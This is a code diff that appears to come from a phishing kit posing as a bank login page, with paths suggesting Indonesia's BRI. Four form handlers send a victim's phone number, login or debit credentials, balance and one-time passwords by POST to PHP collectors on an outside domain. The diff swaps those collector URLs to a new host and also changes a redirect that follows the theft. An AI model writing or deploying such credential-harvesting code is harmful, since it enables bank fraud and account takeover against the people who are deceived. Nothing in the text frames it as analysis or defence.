@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.ll-feed.cfd/bri/v1-vt69od/no.php',
+        url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/v1-vt69od/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.ll-feed.cfd/bri/v1-vt69od/login.php',
+        url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/v1-vt69od/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.ll-feed.cfd/bri/v1-vt69od/saldo.php',
+        url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/v1-vt69od/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.ll-feed.cfd/bri/v1-vt69od/otp.php',
+        url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/v1-vt69od/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
@@ -127,7 +127,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://choreoapps.ll-feed.cfd/wa/v1-vt69od';
+location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/v1-vt69od';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
